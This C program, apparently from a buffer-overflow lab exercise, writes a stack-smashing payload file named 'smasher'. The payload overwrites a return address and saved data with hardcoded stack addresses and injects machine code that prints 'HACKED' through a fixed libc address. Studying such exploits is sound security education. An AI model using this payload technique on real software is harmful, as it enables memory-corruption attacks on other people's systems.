#include <stdlib.h>
#include <stdio.h>
#include <string.h>

static char code[182] = { 
                       0xeb, 0x3e, 0x00, 0x00, 0x00, 0x00, 0x00,		  // movl	
                       0x8b, 0x45, 0xfc, 		                          // mov	
                       0xc9,                   					 // leaveq	
                       0xc3,  							// retq
		       0,0,0,0,0,0,0,0,0,0,
		       0,0,0,0,0,0,0,0,0,0,

		       0x70, 0xe1, 0xff, 0xf7, 0x50, 0x00, 0x00, 0x00, 		    // parameter (char*)
		       0x2b,0x07,0x40,0x00,0x00,0x00,0x00,0x00,                       // parameter (int)
		       0xd0, 0xdf, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00,                // static link 
		       0xd0, 0xdd, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00,                 // return address

			//hacked p baixo 64
		       0x55,
		       0x48, 0x89, 0xe5,
		       0x48, 0x83, 0xec, 0x20,
		       0x89, 0x7d, 0xec,
		       0x48, 0x89, 0x75, 0xe0,
		       0x64, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00,
		       0x00, 0x00,
		       0x48, 0x89, 0x45, 0xf8,
		       0x31, 0xc0,
		       0x48, 0x8b, 0x05, 0x79, 0x09, 0x20, 0x00,
		       0x48, 0x89, 0xc6,
		       0x48, 0x8d, 0x3d, 0xcb, 0x00, 0x00, 0x00,
		       0xb8, 0x00, 0x00, 0x00, 0x00,
		       0xe8, 0xad, 0xfe, 0xff, 0xff,
		       0xc6, 0x45, 0xf0, 0x48,
		       0xc6, 0x45, 0xf1, 0x41,
		       0xc6, 0x45, 0xf2, 0x43,
		       0xc6, 0x45, 0xf3, 0x4b,
		       0xc6, 0x45, 0xf4, 0x45,
		       0xc6, 0x45, 0xf5, 0x44,
		       0xc6, 0x45, 0xf6, 0x0a,
		       0xc6, 0x45, 0xf7, 0x00,
		       0x48, 0x8d, 0x45, 0xf0,
		       0x48, 0xba, 0x80, 0x8e, 0xa4, 0xf7, 0xff,
		       0x7f, 0x00, 0x00,
		       0x48, 0x89, 0xc7,
		       0xb8, 0x00, 0x00, 0x00, 0x00,
		       0xff, 0xd2,
		       0xeb, 0xc6,
		       0x0f, 0x1f, 0x00
		        
};

int main(int argc, const char * argv[])
{ 
    FILE *badfile;
    badfile = fopen("smasher", "w");
    fwrite(code, sizeof(char), sizeof(code), badfile);
    printf("SIZE=%lu\n",sizeof(code));
  return 0;
}
